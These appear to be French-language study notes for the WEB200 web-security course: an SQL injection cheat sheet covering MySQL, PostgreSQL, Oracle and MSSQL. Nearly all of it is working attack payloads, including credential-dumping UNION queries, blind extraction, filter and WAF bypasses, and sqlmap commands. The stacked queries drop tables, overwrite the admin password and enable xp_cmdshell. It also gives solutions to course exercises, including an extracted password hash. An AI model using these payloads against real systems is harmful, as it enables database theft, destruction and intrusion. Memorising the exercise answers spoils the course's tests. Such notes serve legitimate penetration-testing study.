
## 📋 Table des matières

1. [Identification & Discovery](#1-identification--discovery)
2. [Error-Based Injection](#2-error-based-injection)
3. [UNION-Based Injection](#3-union-based-injection)
4. [Boolean-Based Blind](#4-boolean-based-blind)
5. [Time-Based Blind](#5-time-based-blind)
6. [Stacked Queries](#6-stacked-queries)
7. [Énumération Base de Données](#7-%C3%A9num%C3%A9ration-base-de-donn%C3%A9es)
8. [Extraction de Données](#8-extraction-de-donn%C3%A9es)
9. [Bypasses & Contournements](#9-bypasses--contournements)
10. [Cheat Sheet Rapide](#10-cheat-sheet-rapide)

---

## 1. Identification & Discovery

Si requête delete privilégier stacked queries

### 1.1 Payloads de Test Initiaux

**Basiques (tous SGBD) :**

```sql
'
"
`
')
"))
'))
'--
'#
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 'a'='a
') OR ('x'='x
admin' --
admin' #
```

### 1.2 String Delimiters par SGBD

**MySQL :**

```sql
1' or '1'='1
1' or 1=1#
1' or 1=1-- -
foo' UNION SELECT NULL#
```

**PostgreSQL :**

```sql
' or 1=1; --
1' or '1'='1' --
' OR 1=1 --
```

**Oracle :**

```sql
' OR 1=1 -- -
' OR 'a'='a' --
' UNION SELECT NULL FROM dual--
```

**SQL Server (MSSQL) :**

```sql
' OR 1=1 -- -
' OR 'a'='a' --
admin'--
```

### 1.3 Closing Functions

**Si injection dans une fonction LIKE() :**

```sql
# MySQL
foo') or id=11 -- %
Tostadas') or id=10 -- %

# PostgreSQL
foo') or id=11 -- %

# Oracle
foo') OR id=11 -- -

# MSSQL
foo') OR id=11 -- -
```

### 1.4 Détection du Nombre de Colonnes

**ORDER BY (tous SGBD) :**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
# Continue jusqu'à erreur

# Avec parenthèses
')) ORDER BY 1 -- -
')) ORDER BY 2 -- -
')) ORDER BY 3 -- -
')) ORDER BY 4 -- -
')) ORDER BY 5 -- -
```

**UNION SELECT NULL :**

```sql
# MySQL / PostgreSQL / MSSQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--

# Oracle (nécessite FROM dual)
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT NULL,NULL,NULL FROM dual--
```

### 1.5 Fuzzing avec wfuzz

```bash
# Fuzzer le paramètre 'name'
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -d "name=FUZZ&sort=id&order=asc" \
  -u http://target/api/endpoint

# Fuzzer le paramètre 'order'
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -d "db=mssql&name=test&sort=id&order=FUZZ" \
  -u http://target/api/fuzzing

# Observer les réponses :
# - 200 avec size > 200 = potentiellement exploitable
# - 500 avec contenu = messages d'erreur utiles
```

---

## 2. Error-Based Injection

### 2.1 MySQL

**EXTRACTVALUE :**

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--

# Extraction colonne par colonne
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))--

# Extraction avec substring (pour contourner limite de 32 chars)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT substring(password,1,29) FROM users LIMIT 0,1)))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT substring(password,30,32) FROM users LIMIT 0,1)))--
```

**UPDATEXML :**

```sql
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e),1)--
```

**Exemple concret de l'exercice :**

```sql
# Extraction du hash admin en 2 parties (limite 32 chars)
asc, extractvalue('',concat('>',(select substring(password,1,29) from piwigo_users limit 1 offset 0)))
asc, extractvalue('',concat('>',(select substring(password,30,32) from piwigo_users limit 1 offset 0)))

# Résultat : $P$Ghxmchgk.0YxEQutC7os3dZfBvqGIz/
```

### 2.2 PostgreSQL

**CAST Error :**

```sql
' AND 1=CAST((SELECT version()) AS INT)--
' AND 1=CAST((SELECT current_database()) AS INT)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT)--
```

### 2.3 Oracle

**UTL_INADDR :**

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
```

**CTXSYS.DRITHSX :**

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### 2.4 SQL Server (MSSQL)

**CONVERT/CAST Error :**

```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS INT)--
' AND 1=CONVERT(INT,(SELECT DB_NAME()))--

# Énumération des bases
inStock=cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)&name=&sort=id&order=asc

# Pour la base suivante
inStock=cast((SELECT name FROM sys.databases ORDER BY name OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY) as integer)&name=&sort=id&order=asc

# Toutes les bases en une fois
inStock=cast((select string_agg(name, ',') from sys.databases) as integer)&name=a&sort=id&order=asc

# Énumération des tables dans 'exercise'
inStock=cast((SELECT table_name FROM exercise.information_schema.tables ORDER BY table_name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)&name=&sort=id&order=asc

# Énumération des colonnes
inStock=cast((select string_agg(column_name, ',') from exercise.information_schema.columns where table_name = 'secrets') as integer)&name=&sort=id&order=asc

# Extraction finale
inStock=cast((select distinct flag from exercise.dbo.secrets) as integer)&name=a&sort=id&order=asc
```

**Explication OFFSET / FETCH :**

```sql
-- OFFSET n = saute les n premières lignes
-- FETCH NEXT 1 ROWS ONLY = prend seulement la ligne suivante
-- Pour voir la 1ère ligne : OFFSET 0
-- Pour voir la 2ème ligne : OFFSET 1
-- Pour voir la 3ème ligne : OFFSET 2
```

**Technique string_agg :**

```sql
-- string_agg(colonne, ',') = colle toutes les valeurs avec une virgule
-- Résultat : toutes les valeurs en une seule erreur !
```

---

## 3. UNION-Based Injection

### 3.1 Déterminer Colonnes Affichées

**MySQL / PostgreSQL / MSSQL :**

```sql
# Après avoir trouvé le nombre de colonnes (ex: 4)
' UNION SELECT 1,2,3,4--
' UNION SELECT 'a','b','c','d'--
' UNION SELECT NULL,NULL,NULL,NULL--

# Observer quelles colonnes s'affichent dans la réponse
```

**Oracle :**

```sql
' UNION SELECT 'a','b','c','d' FROM dual--
' UNION SELECT NULL,NULL,NULL,NULL FROM dual--
```

### 3.2 Extraction Version & Info

**MySQL :**

```sql
' UNION SELECT NULL,version(),NULL,NULL--
' UNION SELECT NULL,database(),NULL,NULL--
' UNION SELECT NULL,user(),NULL,NULL--
' UNION SELECT NULL,@@version,NULL,NULL--
' UNION SELECT NULL,@@hostname,NULL,NULL--
```

**PostgreSQL :**

```sql
' UNION SELECT NULL,version(),NULL,NULL--
' UNION SELECT NULL,current_database(),NULL,NULL--
' UNION SELECT NULL,current_user,NULL,NULL--
```

**Oracle :**

```sql
' UNION SELECT NULL,banner,NULL,NULL FROM v$version--
' UNION SELECT NULL,user,NULL,NULL FROM dual--
```

**MSSQL :**

```sql
' UNION SELECT NULL,@@version,NULL,NULL--
' UNION SELECT NULL,DB_NAME(),NULL,NULL--
' UNION SELECT NULL,SYSTEM_USER,NULL,NULL--
```

### 3.3 Énumération Tables

**MySQL :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

# Table spécifique
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--
```

**PostgreSQL :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT NULL,string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
```

**Oracle :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL,NULL FROM all_tables WHERE ROWNUM=1--
```

**MSSQL :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT NULL,STRING_AGG(table_name,','),NULL,NULL FROM information_schema.tables--
```

### 3.4 Énumération Colonnes

**MySQL :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**PostgreSQL :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Oracle :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**MSSQL :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,STRING_AGG(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 3.5 Extraction Données

**MySQL :**

```sql
' UNION SELECT NULL,username,password,NULL FROM users--
' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL,NULL FROM users--

# Ligne par ligne
' UNION SELECT NULL,username,password,NULL FROM users LIMIT 0,1--
' UNION SELECT NULL,username,password,NULL FROM users LIMIT 1,1--
```

**PostgreSQL :**

```sql
' UNION SELECT NULL,username,password,NULL FROM users--
' UNION SELECT NULL,string_agg(username||':'||password,','),NULL,NULL FROM users--

# Avec OFFSET
' UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 0--
' UNION SELECT NULL,username,password,NULL FROM users LIMIT 1 OFFSET 1--
```

**Oracle :**

```sql
' UNION SELECT NULL,username,password,NULL FROM users WHERE ROWNUM=1--
' UNION SELECT NULL,username||':'||password,NULL,NULL FROM users WHERE ROWNUM=1--
```

**MSSQL :**

```sql
' UNION SELECT NULL,username,password,NULL FROM users--
' UNION SELECT NULL,STRING_AGG(username+':'+password,','),NULL,NULL FROM users--
' UNION SELECT TOP 1 NULL,username,password,NULL FROM users--
```

---

## 4. Boolean-Based Blind

### 4.1 Tests Basiques

**Vrai (TRUE) :**

```sql
' AND 1=1--
' AND 'a'='a'--
' OR 1=1--
') AND 1=1--
') OR 1=1--
```

**Faux (FALSE) :**

```sql
' AND 1=2--
' AND 'a'='b'--
' AND 1=0--
') AND 1=2--
```

### 4.2 Extraction Caractère par Caractère

**MySQL :**

```sql
# Tester si la première lettre du nom de la DB est 't'
' AND SUBSTRING(database(),1,1)='t'--
' AND SUBSTRING(database(),2,1)='e'--
' AND SUBSTRING(database(),3,1)='s'--

# Version avec ASCII
' AND ASCII(SUBSTRING(database(),1,1))>100--
' AND ASCII(SUBSTRING(database(),1,1))>110--
```

**PostgreSQL :**

```sql
' AND SUBSTRING(current_database(),1,1)='t'--
' AND ASCII(SUBSTRING(current_database(),1,1))>100--
```

**Oracle :**

```sql
' AND SUBSTR((SELECT user FROM dual),1,1)='S'--
' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>83--
```

**MSSQL :**

```sql
' AND SUBSTRING(DB_NAME(),1,1)='m'--
' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100--
```

### 4.3 Longueur de Chaîne

**MySQL :**

```sql
' AND LENGTH(database())=5--
' AND LENGTH((SELECT password FROM users WHERE username='admin'))>20--
```

**PostgreSQL :**

```sql
' AND LENGTH(current_database())=8--
```

**Oracle :**

```sql
' AND LENGTH((SELECT user FROM dual))=5--
```

**MSSQL :**

```sql
' AND LEN(DB_NAME())=6--
' AND LEN((SELECT password FROM users WHERE username='admin'))>20--
```

---

## 5. Time-Based Blind

### 5.1 MySQL

**SLEEP :**

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

# Extraction avec IF
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))>100,SLEEP(5),0)--
```

**BENCHMARK :**

```sql
' AND BENCHMARK(5000000,SHA1('test'))--
' AND IF(1=1,BENCHMARK(5000000,SHA1('test')),0)--
```

### 5.2 PostgreSQL

**pg_sleep :**

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='p') THEN pg_sleep(5) ELSE 0 END)--
```

### 5.3 Oracle

**DBMS_PIPE.RECEIVE_MESSAGE :**

```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)--
' AND (SELECT CASE WHEN SUBSTR(user,1,1)='S' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)--
```

**DBMS_LOCK.SLEEP :**

```sql
' AND 1=(SELECT COUNT(*) FROM all_tables WHERE DBMS_LOCK.SLEEP(5) IS NULL)--
```

### 5.4 SQL Server (MSSQL)

**WAITFOR DELAY :**

```sql
'; WAITFOR DELAY '0:0:5'--
' AND IF(1=1) WAITFOR DELAY '0:0:5'--
' AND IF((SELECT COUNT(*) FROM users)>0) WAITFOR DELAY '0:0:5'--

# Extraction
' AND IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--
' AND IF(ASCII(SUBSTRING(DB_NAME(),1,1))>100) WAITFOR DELAY '0:0:5'--
```

---

## 6. Stacked Queries

### 6.1 Support par SGBD

|SGBD|Stacked Queries|
|---|---|
|MySQL|Oui (selon driver)|
|PostgreSQL|Oui|
|Oracle|Non|
|MSSQL|Oui|

### 6.2 Payloads MySQL

```sql
'; DROP TABLE users--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; INSERT INTO users (username,password) VALUES ('hacker','pass123')--

# Avec condition
'; UPDATE users SET password='hacked' WHERE username='admin' AND SLEEP(0)--
```

### 6.3 Payloads PostgreSQL

```sql
'; DROP TABLE users CASCADE--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; CREATE TABLE backdoor (id INT, data TEXT)--
```

### 6.4 Payloads MSSQL

```sql
'; DROP TABLE users--
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--
```

---

## 7. Énumération Base de Données

### 7.1 Tables Système Important

|SGBD|Tables Système|
|---|---|
|MySQL|`information_schema.tables/columns`|
|PostgreSQL|`information_schema.tables/columns`|
|Oracle|`all_tables`, `all_tab_columns`, `v$version`|
|MSSQL|`sys.databases`, `information_schema.tables`|

### 7.2 MySQL - Énumération Complète

**Lister les bases :**

```sql
' UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata--
' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL,NULL FROM information_schema.schemata--
```

**Lister les tables :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='mydb'--
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Lister les colonnes :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(table_name,':',column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=database()--
```

**Compter les lignes :**

```sql
' UNION SELECT NULL,COUNT(*),NULL,NULL FROM users--
```

### 7.3 PostgreSQL - Énumération Complète

**Lister les schémas :**

```sql
' UNION SELECT NULL,schema_name,NULL,NULL FROM information_schema.schemata--
```

**Lister les tables :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT NULL,string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
```

**Lister les colonnes :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 7.4 Oracle - Énumération Complète

**Lister les tables :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM all_tables--
' UNION SELECT NULL,table_name,NULL,NULL FROM user_tables--
```

**Lister les colonnes :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT NULL,column_name,NULL,NULL FROM user_tab_columns WHERE table_name='USERS'--
```

**Version :**

```sql
' UNION SELECT NULL,banner,NULL,NULL FROM v$version--
```

### 7.5 MSSQL - Énumération Complète

**Lister les bases :**

```sql
' UNION SELECT NULL,name,NULL,NULL FROM sys.databases--
' UNION SELECT NULL,STRING_AGG(name,','),NULL,NULL FROM sys.databases--
```

**Lister les tables :**

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT NULL,table_name,NULL,NULL FROM mydb.information_schema.tables--
```

**Lister les colonnes :**

```sql
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,STRING_AGG(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## 8. Extraction de Données

### 8.1 Condensation avec Concaténation

**MySQL - GROUP_CONCAT :**

```sql
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR ';'),NULL,NULL FROM users--
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--

# Limiter les résultats
' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR ';'),NULL,NULL FROM (SELECT * FROM users LIMIT 10) AS temp--
```

**PostgreSQL - string_agg :**

```sql
' UNION SELECT NULL,string_agg(username||':'||password,';'),NULL,NULL FROM users--
' UNION SELECT NULL,string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
```

**Oracle - LISTAGG :**

```sql
' UNION SELECT NULL,LISTAGG(username||':'||password,';') WITHIN GROUP (ORDER BY username),NULL,NULL FROM users--
```

**MSSQL - STRING_AGG :**

```sql
' UNION SELECT NULL,STRING_AGG(username+':'+password,';'),NULL,NULL FROM users--
' UNION SELECT NULL,STRING_AGG(table_name,','),NULL,NULL FROM information_schema.tables--
```

### 8.2 Techniques de Dump Complet

**Dump users MySQL :**

```sql
# Méthode 1 : GROUP_CONCAT
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3,4 FROM users--

# Méthode 2 : Ligne par ligne
' UNION SELECT 1,username,password,4 FROM users LIMIT 0,1--
' UNION SELECT 1,username,password,4 FROM users LIMIT 1,1--
' UNION SELECT 1,username,password,4 FROM users LIMIT 2,1--

# Méthode 3 : Avec numérotation
' UNION SELECT 1,CONCAT(username,' - ',password),id,4 FROM users ORDER BY id--
```

**Dump users PostgreSQL :**

```sql
' UNION SELECT NULL,string_agg(username||':'||password||':'||email,E'\n'),NULL,NULL FROM users--
' UNION SELECT NULL,username,password,email FROM users LIMIT 1 OFFSET 0--
' UNION SELECT NULL,username,password,email FROM users LIMIT 1 OFFSET 1--
```

---

## 9. Bypasses & Contournements

### 9.1 Commentaires Alternatifs

```sql
# MySQL
'-- -
'#
'/**/
'-- 
'%23

# PostgreSQL
'--
'/**/

# Oracle
'--

# MSSQL
'--
'/**/
```

### 9.2 Espaces Alternatifs

```sql
# Tabulation
'%09AND%091=1--

# Nouvelle ligne
'%0AAND%0A1=1--

# Commentaire inline MySQL
'/**/AND/**/1=1--

# Parenthèses
'AND(1)=(1)--

# Mélange
'%09AND%09(1)=(1)--
```

### 9.3 Contournement Filtres

**Si ' est filtré :**

```sql
# Utiliser " si possible
" OR 1=1--

# En hexadécimal (MySQL)
0x61646D696E = 'admin'
' OR username=0x61646D696E--

# CHAR() (MSSQL)
' OR username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--
```

**Si = est filtré :**

```sql
' OR 1 LIKE 1--
' OR 'a' LIKE 'a'--
```

**Si AND/OR filtrés :**

```sql
# Utiliser && et ||
' && 1=1--
' || 1=1--

# Utiliser double logique
' | 1--
' & 1--
```

**Si UNION filtré :**

```sql
# Variations casse
' UnIoN SeLeCt--
' uNiOn sElEcT--

# Commentaires inline
'/**/UNION/**/SELECT--
'/*uni*//*on*//*sel*//*ect*/--

# Encodage
' %55nion %53elect--
```

**Si WHERE filtré :**

```sql
# Utiliser HAVING
' GROUP BY id HAVING 1=1--

# Utiliser LIMIT
' LIMIT 1,1 UNION SELECT ...--
```

**Si espaces filtrés :**

```sql
'AND(1)=(1)--
'+AND+1=1--
'/**/AND/**/1=1--
'%0AAND%0A1=1--
```

### 9.4 Encodage

**URL Encoding :**

```sql
' OR 1=1-- devient:
%27%20OR%201%3D1%2D%2D
```

**Double URL Encoding :**

```sql
' devient %27 puis %2527
```

**Unicode :**

```sql
' = %u0027
```

---

## 10. Cheat Sheet Rapide

### 10.1 Workflow Standard

```
1. TEST INITIAL
   → ' " ') ")) ')) '-- '# 

2. IDENTIFIER LE SGBD
   → Regarder message d'erreur
   → Tester fonctions spécifiques

3. DÉTERMINER NOMBRE DE COLONNES
   → ORDER BY 1,2,3...
   → UNION SELECT NULL,NULL...

4. TROUVER COLONNES AFFICHÉES
   → UNION SELECT 'a','b','c'...

5. EXTRAIRE INFO
   → Version, base, user
   → Tables, colonnes
   → Données sensibles

6. DUMP DONNÉES
   → GROUP_CONCAT / string_agg
   → Ligne par ligne si nécessaire
```

### 10.2 Payloads 1-Ligne Essentiels

**Test rapide :**

```sql
' OR 1=1--
```

**Dump rapide MySQL :**

```sql
' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Dump rapide users MySQL :**

```sql
' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL,NULL FROM users--
```

**Version rapide :**

```sql
' UNION SELECT NULL,@@version,NULL,NULL--    # MySQL/MSSQL
' UNION SELECT NULL,version(),NULL,NULL--     # PostgreSQL
' UNION SELECT NULL,banner,NULL,NULL FROM v$version--  # Oracle
```

### 10.3 Différences SGBD Critiques

|Feature|MySQL|PostgreSQL|Oracle|MSSQL|
|---|---|---|---|---|
|**Commentaire**|`#` ou `-- -`|`--`|`--`|`--`|
|**Limite résultats**|`LIMIT n`|`LIMIT n`|`ROWNUM<=n`|`TOP n`|
|**Concaténation**|`CONCAT()` ou `||`|`|
|**String agg**|`GROUP_CONCAT()`|`string_agg()`|`LISTAGG()`|`STRING_AGG()`|
|**Substring**|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|`SUBSTRING()`|
|**Sleep**|`SLEEP(n)`|`pg_sleep(n)`|`DBMS_PIPE...`|`WAITFOR DELAY`|
|**Stacked queries**|Oui*|Oui|Non|Oui|
|**String delimiter**|`'` ou `"`|`'`|`'`|`'`|

* Dépend du driver

### 10.4 Info Cruciales Exercices

**Exercise 8.3.1 (Error-based MSSQL) :**

```sql
# Énumération bases
inStock=cast((SELECT name FROM sys.databases ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) as integer)

# Toutes bases en 1 fois
inStock=cast((select string_agg(name, ',') from sys.databases) as integer)

# Colonnes de 'secrets'
inStock=cast((select string_agg(column_name, ',') from exercise.information_schema.columns where table_name = 'secrets') as integer)

# Flag final
inStock=cast((select distinct flag from exercise.dbo.secrets) as integer)
```

**Exercise 8.3.2 (UNION-based) :**

```sql
# Fermeture requête
a')) ORDER BY 4 -- -    # 4 colonnes confirmées

# Extraction
a')) UNION SELECT 1,2,3,4 -- -
```

**Exercise 8.5.3 (MySQL extractvalue) :**

```sql
# Hash admin en 2 parties (limite 32 chars)
asc, extractvalue('',concat('>',(select substring(password,1,29) from piwigo_users limit 1 offset 0)))
asc, extractvalue('',concat('>',(select substring(password,30,32) from piwigo_users limit 1 offset 0)))
```

---

## 📝 Notes Importantes

### Limites à Connaître

- **MySQL EXTRACTVALUE** : Max 32 caractères → Utiliser `SUBSTRING()`
- **Oracle** : Toujours `FROM dual` pour SELECT simple
- **MSSQL OFFSET** : Nécessite `ORDER BY` obligatoire
- **GROUP_CONCAT MySQL** : Limite par défaut 1024 chars → Augmenter avec `SET SESSION group_concat_max_len = 1000000`

### Priorités WEB200

1. **Maîtriser UNION-based** (le plus fréquent)
2. **Error-based** (très efficace quand ça marche)
3. **Connaître les différences SGBD**
4. **Savoir fermer les parenthèses/quotes**
5. **Techniques OFFSET/LIMIT pour itération**

### Conseils Pratiques

- Toujours commencer par **identifier le SGBD**
- Utiliser **Burp Repeater** pour tester payloads
- **wfuzz** pour fuzzing rapide avec wordlist
- Noter les **messages d'erreur** = mine d'or d'info
- Penser aux **parenthèses multiples** : `'))` vs `')` vs `'`

---

## 🚀 Pour Aller Plus Loin

### SQLMap - Commandes Essentielles

```bash
# Scan basique
sqlmap -u "http://target/api?id=1" --dbs

# Avec POST data
sqlmap -u "http://target/api" --method POST --data "name=test&sort=id&order=asc" -p "name,sort,order"

# Dump une base
sqlmap -u "http://target/api?id=1" -D database_name --dump

# Dump une table
sqlmap -u "http://target/api?id=1" -D database_name -T users --dump

# Avec cookies/auth
sqlmap -u "http://target/api?id=1" --cookie="PHPSESSID=abc123" --dbs

# Level et risk élevés
sqlmap -u "http://target/api?id=1" --level=5 --risk=3
```

---

**🎯 Bon courage pour la préparation intensive !**  
**📅 Période : 26 janvier - 13 mars 2026**  
**💪 Team Isis - WEB200**